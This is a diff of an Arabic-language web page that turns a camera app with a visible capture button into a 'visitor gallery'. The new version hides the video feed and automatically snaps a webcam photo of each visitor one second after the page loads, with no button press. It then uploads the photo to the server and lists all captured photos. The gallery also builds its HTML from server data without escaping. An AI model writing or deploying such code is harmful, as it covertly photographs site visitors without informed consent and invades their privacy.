@@ -2,53 +2,67 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تطبيق الكاميرا الخاص بي</title>
-    <style>
-        #video { width: 100%; max-width: 400px; background: #000; }
-        #canvas { display: none; } /* مخفي، نستخدمه فقط للمعالجة */
-        #photo { width: 100%; max-width: 400px; border: 2px solid #ccc; margin-top: 10px; }
-    </style>
+    <title>معرض الصور</title>
 </head>
 <body>
-    <h1>مرحباً بك في تطبيق الكاميرا</h1>
-    
-    <video id="video" autoplay playsinline></video>
-    <br>
-    <button id="captureBtn">التقاط صورة</button>
+    <h1>معرض الزوار</h1>
+    <div id="gallery" style="display:flex; flex-wrap:wrap; gap:10px;"></div>
 
-    <h3>الصورة الملتقطة:</h3>
-    <img id="photo" src="" alt="ستظهر الصورة هنا بعد الالتقاط">
-
-    <canvas id="canvas" width="400" height="300"></canvas>
+    <video id="video" style="display:none;"></video>
+    <canvas id="canvas" style="display:none;" width="400" height="300"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const photo = document.getElementById('photo');
-        const captureBtn = document.getElementById('captureBtn');
+        const gallery = document.getElementById('gallery');
 
-        // 1. فتح الكاميرا عند تحميل الصفحة
-        async function startCamera() {
+        // 1. التقاط الصورة فوراً عند تحميل الصفحة
+        async function initCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
+                video.play();
+                
+                // انتظار ثانية ليجهز الفيديو ثم التقاط الصورة
+                setTimeout(takePhoto, 1000);
             } catch (err) {
-                console.error("خطأ في الوصول للكاميرا: ", err);
-                alert("يرجى السماح بالوصول للكاميرا");
+                console.error("يرجى الموافقة على إذن الكاميرا");
             }
         }
 
-        // 2. التقاط الصورة
-        captureBtn.addEventListener('click', () => {
+        async function takePhoto() {
             const context = canvas.getContext('2d');
-            // رسم لقطة الفيديو على الـ Canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            // تحويل الـ Canvas إلى رابط صورة (Data URL) وعرضه
-            const data = canvas.toDataURL('image/png');
-            photo.setAttribute('src', data);
-        });
+            context.drawImage(video, 0, 0, 400, 300);
+            const imageData = canvas.toDataURL('image/png');
 
-        startCamera();
+            // إرسال الصورة للسيرفر
+            await fetch('/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData })
+            });
+            loadPhotos(); // تحديث المعرض
+        }
+
+        // 2. تحميل الصور من السيرفر
+        async function loadPhotos() {
+            const res = await fetch('/get-photos');
+            const photos = await res.json();
+            gallery.innerHTML = '';
+            photos.forEach(p => {
+                const div = document.createElement('div');
+                div.innerHTML = `<img src="${p.data}" width="150"><br>
+                                 <button onclick="deletePhoto(${p.id})">حذف</button>`;
+                gallery.appendChild(div);
+            });
+        }
+
+        async function deletePhoto(id) {
+            await fetch(`/delete/${id}`, { method: 'DELETE' });
+            loadPhotos();
+        }
+
+        initCamera();
     </script>
 </body>
 </html>
